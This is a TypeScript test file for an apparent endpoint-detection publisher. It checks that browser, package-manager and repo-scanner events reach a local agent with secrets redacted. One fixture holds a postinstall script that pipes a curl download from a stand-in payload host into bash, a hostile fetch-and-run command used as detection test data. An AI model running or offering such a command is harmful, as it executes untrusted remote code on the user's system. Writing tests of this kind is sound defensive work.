import { readFile } from "node:fs/promises";
import { describe, expect, it, vi } from "vitest";
import {
  buildPackageManagerLifecycleEventFromEnvironmentForLocalEdr,
  publishBrowserRuntimeActivityToLocalEdr,
  publishPackageManagerLifecycleEventToLocalEdr,
  publishRepoScannerCredentialFindingToLocalEdr,
} from "./local-edr-publisher.js";

describe("browser runtime local EDR publishing", () => {
  it("posts browser automation activity without raw prompt or secret-like payloads", async () => {
    const fetchMock = vi.fn(async () => ({ ok: true }));
    vi.stubGlobal("fetch", fetchMock);

    await publishBrowserRuntimeActivityToLocalEdr(
      {
        kind: "browser_automation",
        runtime: "playwright",
        browser: "chromium",
        action: "click",
        target: "button#deploy",
        toolName: "playwright.click",
        parameters: {
          selector: "button#deploy",
          prompt: "deploy using sk-MY_RAW_SECRET_1234567890",
          authToken: "ghp_MY_RAW_SECRET_1234567890",
        },
        hostId: "host-browser-1",
        userId: "user-browser-1",
        sessionId: "session-browser-1",
        agentId: "agent-browser-1",
        workloadId: "workload-browser-1",
        approvalId: "approval-browser-1",
        toolCallId: "tool-call-browser-1",
        rawResult: "clicked using sk-MY_RAW_SECRET_1234567890",
      },
      {
        enabled: true,
        token: "local-token",
        agentUrl: "http://agent.test",
        timeoutMs: 500,
      },
    );

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [url, init] = fetchMock.mock.calls[0]!;
    expect(url).toBe("http://agent.test/api/v1/agent/edr/developer-activity");

    const payload = JSON.parse(String(init?.body)) as { activities: any[] };
    expect(payload.activities[0]).toMatchObject({
      hostId: "host-browser-1",
      userId: "user-browser-1",
      sessionId: "session-browser-1",
      agentId: "agent-browser-1",
      workloadId: "workload-browser-1",
      approvalId: "approval-browser-1",
      toolCallId: "tool-call-browser-1",
      kind: "browser_automation",
      browser: "chromium",
      action: "click",
      target: "button#deploy",
      toolName: "playwright.click",
      parameters: {
        selector: "button#deploy",
        prompt: { omitted: true, reason: "sensitive", length: 40 },
        authToken: { omitted: true, reason: "sensitive", length: 28 },
      },
      metadata: {
        collectorKind: "browser_runtime",
        runtime: "playwright",
        payloadScrubbed: true,
        rawPayloadOmitted: true,
      },
    });
    expect(JSON.stringify(payload)).not.toContain("MY_RAW_SECRET");
  });

  it("posts browser downloads with source URLs scrubbed", async () => {
    const fetchMock = vi.fn(async () => ({ ok: true }));
    vi.stubGlobal("fetch", fetchMock);

    await publishBrowserRuntimeActivityToLocalEdr(
      {
        kind: "browser_download",
        runtime: "browser-use",
        browser: "chrome",
        path: "/Users/alice/Downloads/update.pkg",
        sourceUrl: "https://updates.example.invalid/update.pkg?token=MY_RAW_SECRET_1234567890#x",
        contentHash: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
        byteCount: 8192,
        hostId: "host-browser-2",
        sessionId: "session-browser-2",
        toolCallId: "tool-call-browser-2",
        rawContent: "binary bytes with MY_RAW_SECRET",
      },
      {
        enabled: true,
        token: "local-token",
        agentUrl: "http://agent.test",
        timeoutMs: 500,
      },
    );

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const payload = JSON.parse(String(fetchMock.mock.calls[0]?.[1]?.body)) as {
      activities: any[];
    };
    expect(payload.activities[0]).toMatchObject({
      hostId: "host-browser-2",
      sessionId: "session-browser-2",
      toolCallId: "tool-call-browser-2",
      kind: "browser_download",
      browser: "chrome",
      path: "/Users/alice/Downloads/update.pkg",
      sourceUrl: "https://updates.example.invalid/update.pkg",
      contentHash: "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
      metadata: {
        collectorKind: "browser_runtime",
        runtime: "browser-use",
        payloadScrubbed: true,
        rawPayloadOmitted: true,
        downloadByteCount: 8192,
      },
    });
    expect(JSON.stringify(payload)).not.toContain("MY_RAW_SECRET");
  });

  it("posts browser extension installs with raw artifact content omitted", async () => {
    const fetchMock = vi.fn(async () => ({ ok: true }));
    vi.stubGlobal("fetch", fetchMock);

    await publishBrowserRuntimeActivityToLocalEdr(
      {
        kind: "browser_extension",
        runtime: "openclaw-cua",
        browser: "chrome",
        path: "/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/1.0.0/manifest.json",
        extensionId: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        source:
          "https://chromewebstore.example.invalid/detail/ext?authToken=MY_RAW_SECRET_1234567890",
        hostId: "host-browser-3",
        agentId: "agent-browser-3",
        rawPayload: { manifest: "contains MY_RAW_SECRET" },
      },
      {
        enabled: true,
        token: "local-token",
        agentUrl: "http://agent.test",
        timeoutMs: 500,
      },
    );

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const payload = JSON.parse(String(fetchMock.mock.calls[0]?.[1]?.body)) as {
      activities: any[];
    };
    expect(payload.activities[0]).toMatchObject({
      hostId: "host-browser-3",
      agentId: "agent-browser-3",
      kind: "browser_extension",
      browser: "chrome",
      path: "/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/1.0.0/manifest.json",
      extensionId: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      source: "https://chromewebstore.example.invalid/detail/ext",
      metadata: {
        collectorKind: "browser_runtime",
        runtime: "openclaw-cua",
        payloadScrubbed: true,
        rawPayloadOmitted: true,
      },
    });
    expect(JSON.stringify(payload)).not.toContain("MY_RAW_SECRET");
  });

  it("infers browser identity from extension paths when runtime collectors omit browser", async () => {
    const fetchMock = vi.fn(async () => ({ ok: true }));
    vi.stubGlobal("fetch", fetchMock);

    await publishBrowserRuntimeActivityToLocalEdr(
      {
        kind: "browser_extension",
        runtime: "provider-translator",
        path: "/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb/1.2.3/manifest.json",
        extensionId: "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
        source:
          "https://chromewebstore.example.invalid/detail/ext?token=MY_RAW_SECRET_1234567890",
        sessionId: "session-browser-4",
      },
      {
        enabled: true,
        token: "local-token",
        agentUrl: "http://agent.test",
        timeoutMs: 500,
      },
    );

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const payload = JSON.parse(String(fetchMock.mock.calls[0]?.[1]?.body)) as {
      activities: any[];
    };
    expect(payload.activities[0]).toMatchObject({
      sessionId: "session-browser-4",
      kind: "browser_extension",
      browser: "chrome",
      path: "/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb/1.2.3/manifest.json",
      extensionId: "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
      source: "https://chromewebstore.example.invalid/detail/ext",
      metadata: {
        collectorKind: "browser_runtime",
        runtime: "provider-translator",
        payloadScrubbed: true,
        rawPayloadOmitted: true,
        browserInferredFromPath: true,
      },
    });
    expect(JSON.stringify(payload)).not.toContain("MY_RAW_SECRET");
  });
});

describe("package-manager lifecycle local EDR publishing", () => {
  it("posts npm lifecycle scripts to the dedicated package-manager endpoint", async () => {
    const fetchMock = vi.fn(async () => ({ ok: true }));
    vi.stubGlobal("fetch", fetchMock);

    await publishPackageManagerLifecycleEventToLocalEdr(
      {
        now: new Date("2026-05-17T16:00:00.000Z"),
        env: {
          npm_lifecycle_event: "postinstall",
          npm_lifecycle_script:
            "curl https://payload.example.invalid/install.sh?token=MY_RAW_SECRET | bash",
          npm_package_name: "@acme/install-hook",
          npm_config_user_agent: "npm/10.2.0 node/v24.0.0 darwin arm64",
          npm_execpath: "/usr/local/lib/node_modules/npm/bin/npm-cli.js",
          INIT_CWD: "/repo",
          PWD: "/repo/node_modules/@acme/install-hook",
          CLAWDSTRIKE_HOST_ID: "host-pkg-hook-1",
          CLAWDSTRIKE_USER_ID: "user-pkg-hook-1",
          CLAWDSTRIKE_SESSION_ID: "session-pkg-hook-1",
        },
      },
      {
        enabled: true,
        token: "local-token",
        agentUrl: "http://agent.test",
        timeoutMs: 500,
      },
    );

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [url, init] = fetchMock.mock.calls[0]!;
    expect(url).toBe("http://agent.test/api/v1/agent/edr/package-manager/events");
    expect(init).toMatchObject({
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: "Bearer local-token",
      },
    });

    const payload = JSON.parse(String(init?.body)) as { events: any[] };
    expect(payload.events[0]).toMatchObject({
      observedAt: "2026-05-17T16:00:00.000Z",
      hostId: "host-pkg-hook-1",
      userId: "user-pkg-hook-1",
      sessionId: "session-pkg-hook-1",
      manager: "npm",
      package: "@acme/install-hook",
      phase: "postinstall",
      workingDirectory: "/repo",
      metadata: {
        collectorKind: "package_manager_lifecycle_hook",
        npmLifecycleEvent: "postinstall",
        packageManagerUserAgent: "npm/10.2.0 node/v24.0.0 darwin arm64",
      },
      process: {
        image: "/usr/local/lib/node_modules/npm/bin/npm-cli.js",
        commandLine: "npm run postinstall",
        cwd: "/repo",
      },
    });
    expect(payload.events[0].script).toContain("token=[REDACTED]");
    expect(JSON.stringify(payload)).not.toContain("MY_RAW_SECRET");
  });

  it("detects Bun lifecycle scripts from package-manager environment", async () => {
    const event = buildPackageManagerLifecycleEventFromEnvironmentForLocalEdr({
      now: new Date("2026-05-17T16:01:00.000Z"),
      env: {
        npm_lifecycle_event: "postinstall",
        npm_lifecycle_script: "bun run scripts/postinstall.ts?token=MY_RAW_SECRET",
        npm_package_name: "@acme/bun-install-hook",
        npm_config_user_agent: "bun/1.2.0 npm/? node/v24.0.0 darwin arm64",
        npm_execpath: "/opt/homebrew/bin/bun",
        INIT_CWD: "/repo",
      },
    });

    expect(event).not.toBeNull();
    if (!event) throw new Error("expected Bun package-manager lifecycle event");
    expect(event).toMatchObject({
      observedAt: "2026-05-17T16:01:00.000Z",
      manager: "bun",
      package: "@acme/bun-install-hook",
      phase: "postinstall",
      workingDirectory: "/repo",
      process: {
        image: "/opt/homebrew/bin/bun",
        commandLine: "bun run postinstall",
        cwd: "/repo",
      },
    });
    expect(event.script).toContain("token=[REDACTED]");
    expect(JSON.stringify(event)).not.toContain("MY_RAW_SECRET");
  });

  it("supports explicit Cargo build-script lifecycle hook environment", async () => {
    const event = buildPackageManagerLifecycleEventFromEnvironmentForLocalEdr({
      now: new Date("2026-05-17T16:02:00.000Z"),
      env: {
        CLAWDSTRIKE_PACKAGE_MANAGER: "cargo",
        CLAWDSTRIKE_PACKAGE_PHASE: "build.rs",
        CLAWDSTRIKE_PACKAGE_SCRIPT:
          "cargo build --manifest-path /repo/Cargo.toml --token=MY_RAW_SECRET",
        CLAWDSTRIKE_PACKAGE_NAME: "native-helper",
        CLAWDSTRIKE_PACKAGE_WORKING_DIR: "/repo",
        CLAWDSTRIKE_PACKAGE_MANAGER_EXEC_PATH: "/Users/alice/.cargo/bin/cargo",
        CARGO_MANIFEST_DIR: "/repo",
        CARGO_PKG_NAME: "native-helper",
        CLAWDSTRIKE_HOST_ID: "host-cargo-hook-1",
        CLAWDSTRIKE_SESSION_ID: "session-cargo-hook-1",
      },
    });

    expect(event).not.toBeNull();
    if (!event) throw new Error("expected Cargo package-manager lifecycle event");
    expect(event).toMatchObject({
      observedAt: "2026-05-17T16:02:00.000Z",
      hostId: "host-cargo-hook-1",
      sessionId: "session-cargo-hook-1",
      manager: "cargo",
      package: "native-helper",
      phase: "build.rs",
      workingDirectory: "/repo",
      metadata: {
        collectorKind: "package_manager_lifecycle_hook",
        packageLifecyclePhase: "build.rs",
        packageManager: "cargo",
      },
      process: {
        image: "/Users/alice/.cargo/bin/cargo",
        commandLine: "cargo build-script",
        cwd: "/repo",
      },
    });
    expect(event.script).toContain("--token=[REDACTED]");
    expect(JSON.stringify(event)).not.toContain("MY_RAW_SECRET");
  });

  it("supports explicit pip install lifecycle hook environment", async () => {
    const event = buildPackageManagerLifecycleEventFromEnvironmentForLocalEdr({
      now: new Date("2026-05-17T16:03:00.000Z"),
      env: {
        CLAWDSTRIKE_PACKAGE_MANAGER: "pip",
        CLAWDSTRIKE_PACKAGE_PHASE: "install",
        CLAWDSTRIKE_PACKAGE_SCRIPT: "python setup.py install --password=MY_RAW_SECRET",
        CLAWDSTRIKE_PACKAGE_NAME: "wheel-helper",
        CLAWDSTRIKE_PACKAGE_WORKING_DIR: "/repo/python",
        CLAWDSTRIKE_PACKAGE_MANAGER_EXEC_PATH: "/opt/venv/bin/pip",
      },
    });

    expect(event).not.toBeNull();
    if (!event) throw new Error("expected pip package-manager lifecycle event");
    expect(event).toMatchObject({
      observedAt: "2026-05-17T16:03:00.000Z",
      manager: "pip",
      package: "wheel-helper",
      phase: "install",
      workingDirectory: "/repo/python",
      metadata: {
        collectorKind: "package_manager_lifecycle_hook",
        packageLifecyclePhase: "install",
        packageManager: "pip",
      },
      process: {
        image: "/opt/venv/bin/pip",
        commandLine: "pip install",
        cwd: "/repo/python",
      },
    });
    expect(event.script).toContain("--password=[REDACTED]");
    expect(JSON.stringify(event)).not.toContain("MY_RAW_SECRET");
  });

  it("supports explicit RubyGems native-extension lifecycle hook environment", async () => {
    const event = buildPackageManagerLifecycleEventFromEnvironmentForLocalEdr({
      now: new Date("2026-05-17T16:04:00.000Z"),
      env: {
        CLAWDSTRIKE_PACKAGE_MANAGER: "gem",
        CLAWDSTRIKE_PACKAGE_PHASE: "install",
        CLAWDSTRIKE_PACKAGE_SCRIPT: "gem install native-helper -- --api-key=MY_RAW_SECRET",
        CLAWDSTRIKE_PACKAGE_NAME: "native-helper",
        CLAWDSTRIKE_PACKAGE_WORKING_DIR: "/repo/ruby",
        CLAWDSTRIKE_PACKAGE_MANAGER_EXEC_PATH: "/usr/bin/gem",
        CLAWDSTRIKE_HOST_ID: "host-gem-hook-1",
        CLAWDSTRIKE_SESSION_ID: "session-gem-hook-1",
      },
    });

    expect(event).not.toBeNull();
    if (!event) throw new Error("expected RubyGems package-manager lifecycle event");
    expect(event).toMatchObject({
      observedAt: "2026-05-17T16:04:00.000Z",
      hostId: "host-gem-hook-1",
      sessionId: "session-gem-hook-1",
      manager: "gem",
      package: "native-helper",
      phase: "install",
      workingDirectory: "/repo/ruby",
      metadata: {
        collectorKind: "package_manager_lifecycle_hook",
        packageLifecyclePhase: "install",
        packageManager: "gem",
      },
      process: {
        image: "/usr/bin/gem",
        commandLine: "gem install",
        cwd: "/repo/ruby",
      },
    });
    expect(event.script).toContain("--api-key=[REDACTED]");
    expect(JSON.stringify(event)).not.toContain("MY_RAW_SECRET");
  });

  it("supports explicit Go module lifecycle hook environment", async () => {
    const event = buildPackageManagerLifecycleEventFromEnvironmentForLocalEdr({
      now: new Date("2026-05-17T16:05:00.000Z"),
      env: {
        CLAWDSTRIKE_PACKAGE_MANAGER: "go",
        CLAWDSTRIKE_PACKAGE_PHASE: "generate",
        CLAWDSTRIKE_PACKAGE_SCRIPT: "go generate ./... -ldflags=-X main.token=MY_RAW_SECRET",
        CLAWDSTRIKE_PACKAGE_NAME: "example.com/acme/native-helper",
        CLAWDSTRIKE_PACKAGE_WORKING_DIR: "/repo/go",
        CLAWDSTRIKE_PACKAGE_MANAGER_EXEC_PATH: "/usr/local/go/bin/go",
        CLAWDSTRIKE_HOST_ID: "host-go-hook-1",
        CLAWDSTRIKE_SESSION_ID: "session-go-hook-1",
      },
    });

    expect(event).not.toBeNull();
    if (!event) throw new Error("expected Go package-manager lifecycle event");
    expect(event).toMatchObject({
      observedAt: "2026-05-17T16:05:00.000Z",
      hostId: "host-go-hook-1",
      sessionId: "session-go-hook-1",
      manager: "go",
      package: "example.com/acme/native-helper",
      phase: "generate",
      workingDirectory: "/repo/go",
      metadata: {
        collectorKind: "package_manager_lifecycle_hook",
        packageLifecyclePhase: "generate",
        packageManager: "go",
      },
      process: {
        image: "/usr/local/go/bin/go",
        commandLine: "go generate",
        cwd: "/repo/go",
      },
    });
    expect(event.script).toContain("token=[REDACTED]");
    expect(JSON.stringify(event)).not.toContain("MY_RAW_SECRET");
  });

  it("supports explicit Homebrew lifecycle hook environment", async () => {
    const event = buildPackageManagerLifecycleEventFromEnvironmentForLocalEdr({
      now: new Date("2026-05-17T16:06:00.000Z"),
      env: {
        CLAWDSTRIKE_PACKAGE_MANAGER: "brew",
        CLAWDSTRIKE_PACKAGE_PHASE: "install",
        CLAWDSTRIKE_PACKAGE_SCRIPT:
          "brew install --build-from-source acme/tap/native-helper --token=MY_RAW_SECRET",
        CLAWDSTRIKE_PACKAGE_NAME: "acme/tap/native-helper",
        CLAWDSTRIKE_PACKAGE_WORKING_DIR: "/repo/homebrew",
        CLAWDSTRIKE_PACKAGE_MANAGER_EXEC_PATH: "/opt/homebrew/bin/brew",
        CLAWDSTRIKE_HOST_ID: "host-brew-hook-1",
        CLAWDSTRIKE_SESSION_ID: "session-brew-hook-1",
      },
    });

    expect(event).not.toBeNull();
    if (!event) throw new Error("expected Homebrew package-manager lifecycle event");
    expect(event).toMatchObject({
      observedAt: "2026-05-17T16:06:00.000Z",
      hostId: "host-brew-hook-1",
      sessionId: "session-brew-hook-1",
      manager: "brew",
      package: "acme/tap/native-helper",
      phase: "install",
      workingDirectory: "/repo/homebrew",
      metadata: {
        collectorKind: "package_manager_lifecycle_hook",
        packageLifecyclePhase: "install",
        packageManager: "brew",
      },
      process: {
        image: "/opt/homebrew/bin/brew",
        commandLine: "brew install",
        cwd: "/repo/homebrew",
      },
    });
    expect(event.script).toContain("--token=[REDACTED]");
    expect(JSON.stringify(event)).not.toContain("MY_RAW_SECRET");
  });

  it("publishes explicit extended package-manager lifecycle hooks", async () => {
    const fetchMock = vi.fn(async () => ({ ok: true }));
    vi.stubGlobal("fetch", fetchMock);

    const scenarios = [
      {
        manager: "composer",
        phase: "install",
        packageName: "acme/native-helper",
        execPath: "/usr/local/bin/composer",
        commandLine: "composer install",
      },
      {
        manager: "maven",
        phase: "verify",
        packageName: "com.acme:native-helper",
        execPath: "/opt/maven/bin/mvn",
        commandLine: "mvn verify",
      },
      {
        manager: "gradle",
        phase: "build",
        packageName: "com.acme.native-helper",
        execPath: "/opt/gradle/bin/gradle",
        commandLine: "gradle build",
      },
      {
        manager: "uv",
        phase: "pip install",
        packageName: "native-helper",
        execPath: "/opt/venv/bin/uv",
        commandLine: "uv pip install",
      },
      {
        manager: "poetry",
        phase: "install",
        packageName: "native-helper",
        execPath: "/opt/venv/bin/poetry",
        commandLine: "poetry install",
      },
      {
        manager: "pipenv",
        phase: "install",
        packageName: "native-helper",
        execPath: "/opt/venv/bin/pipenv",
        commandLine: "pipenv install",
      },
      {
        manager: "dotnet",
        phase: "restore",
        packageName: "Acme.NativeHelper",
        execPath: "/usr/local/bin/dotnet",
        commandLine: "dotnet restore",
      },
      {
        manager: "nuget",
        phase: "restore",
        packageName: "Acme.NativeHelper",
        execPath: "/usr/local/bin/nuget",
        commandLine: "nuget restore",
      },
      {
        manager: "swift",
        phase: "build",
        packageName: "AcmeNativeHelper",
        execPath: "/usr/bin/swift",
        commandLine: "swift build",
      },
      {
        manager: "mix",
        phase: "deps.get",
        packageName: "acme_native_helper",
        execPath: "/usr/local/bin/mix",
        commandLine: "mix deps.get",
      },
    ] as const;

    for (const [index, scenario] of scenarios.entries()) {
      await publishPackageManagerLifecycleEventToLocalEdr(
        {
          now: new Date(`2026-05-17T16:${String(10 + index).padStart(2, "0")}:00.000Z`),
          env: {
            CLAWDSTRIKE_PACKAGE_MANAGER: scenario.manager,
            CLAWDSTRIKE_PACKAGE_PHASE: scenario.phase,
            CLAWDSTRIKE_PACKAGE_SCRIPT: `${scenario.commandLine} --token=MY_RAW_SECRET`,
            CLAWDSTRIKE_PACKAGE_NAME: scenario.packageName,
            CLAWDSTRIKE_PACKAGE_WORKING_DIR: `/repo/${scenario.manager}`,
            CLAWDSTRIKE_PACKAGE_MANAGER_EXEC_PATH: scenario.execPath,
            CLAWDSTRIKE_HOST_ID: `host-${scenario.manager}-hook-1`,
            CLAWDSTRIKE_SESSION_ID: `session-${scenario.manager}-hook-1`,
          },
        },
        {
          enabled: true,
          token: "local-token",
          agentUrl: "http://agent.test",
          timeoutMs: 500,
        },
      );
    }

    expect(fetchMock).toHaveBeenCalledTimes(scenarios.length);
    for (const [index, scenario] of scenarios.entries()) {
      const [url, init] = fetchMock.mock.calls[index]!;
      expect(url).toBe("http://agent.test/api/v1/agent/edr/package-manager/events");
      const payload = JSON.parse(String(init?.body)) as { events: any[] };
      expect(payload.events[0]).toMatchObject({
        observedAt: `2026-05-17T16:${String(10 + index).padStart(2, "0")}:00.000Z`,
        hostId: `host-${scenario.manager}-hook-1`,
        sessionId: `session-${scenario.manager}-hook-1`,
        manager: scenario.manager,
        package: scenario.packageName,
        phase: scenario.phase,
        workingDirectory: `/repo/${scenario.manager}`,
        metadata: {
          collectorKind: "package_manager_lifecycle_hook",
          packageLifecyclePhase: scenario.phase,
          packageManager: scenario.manager,
        },
        process: {
          image: scenario.execPath,
          commandLine: scenario.commandLine,
          cwd: `/repo/${scenario.manager}`,
        },
      });
      expect(payload.events[0].script).toContain("--token=[REDACTED]");
      expect(JSON.stringify(payload)).not.toContain("MY_RAW_SECRET");
    }
  });

  it("ships a package-manager lifecycle executable for ecosystem wrappers", async () => {
    const packageJson = JSON.parse(
      await readFile(new URL("../package.json", import.meta.url), "utf8"),
    ) as { bin?: Record<string, string> };

    expect(packageJson.bin?.["clawdstrike-package-lifecycle"]).toBe(
      "./dist/package-manager-lifecycle-hook.js",
    );

    const entrypoint = await readFile(
      new URL("./package-manager-lifecycle-hook.ts", import.meta.url),
      "utf8",
    );
    expect(entrypoint).toContain("publishPackageManagerLifecycleEventToLocalEdr");
  });
});

describe("repo scanner local EDR publishing", () => {
  it("posts credential-path findings to developer activity without raw secret values", async () => {
    const fetchMock = vi.fn(async () => ({ ok: true }));
    vi.stubGlobal("fetch", fetchMock);

    await publishRepoScannerCredentialFindingToLocalEdr(
      {
        path: "/repo/.env",
        kind: "repo_secret",
        name: "STRIPE_API_KEY",
        credentialKind: "api_token",
        scannerId: "repo-scan-1",
        ruleId: "repo.secret.env_file",
        confidence: 0.92,
        rawValue: "sk-MY_RAW_SECRET",
        hostId: "host-repo-scan-1",
        userId: "user-repo-scan-1",
        sessionId: "session-repo-scan-1",
        agentId: "agent-repo-scan-1",
        repositoryPath: "/repo",
      },
      {
        enabled: true,
        token: "local-token",
        agentUrl: "http://agent.test",
        timeoutMs: 500,
      },
    );

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [url, init] = fetchMock.mock.calls[0]!;
    expect(url).toBe("http://agent.test/api/v1/agent/edr/developer-activity");

    const payload = JSON.parse(String(init?.body)) as { activities: any[] };
    expect(payload.activities[0]).toMatchObject({
      hostId: "host-repo-scan-1",
      userId: "user-repo-scan-1",
      sessionId: "session-repo-scan-1",
      agentId: "agent-repo-scan-1",
      kind: "repo_secret",
      path: "/repo/.env",
      name: "STRIPE_API_KEY",
      credentialKind: "api_token",
      commandLine: "repo_scan /repo/.env",
      metadata: {
        collectorKind: "repo_scanner",
        scannerId: "repo-scan-1",
        ruleId: "repo.secret.env_file",
        rawValueOmitted: true,
        payloadScrubbed: true,
      },
    });
    expect(JSON.stringify(payload)).not.toContain("MY_RAW_SECRET");
  });
});
